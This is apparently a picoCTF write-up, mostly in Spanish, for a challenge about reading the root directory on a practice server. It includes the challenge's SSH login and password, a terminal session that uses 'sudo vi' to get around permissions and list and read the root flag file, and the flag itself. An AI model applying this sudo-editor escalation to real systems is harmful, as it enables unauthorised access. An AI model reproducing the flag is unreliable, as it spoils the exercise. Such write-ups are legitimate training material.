## Objetivo
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 51604 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?
## Solución
```bash
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls root/        
ls: cannot open directory 'root/': Permission denied
picoplayer@challenge:/$ sudo vi

total 16
drwx------ 1 root root   22 Sep 12 02:44 .
drwxr-xr-x 1 root root   63 Sep 12 02:35 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  623 Sep 12 02:44 .viminfo
picoplayer@challenge:/$ sudo vi
[sudo] password for picoplayer: 

picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```
## Notas Adicionales
vi fue de ayuda para poder ver contenido de carpetas a las que no teniamos permisos
## Referencias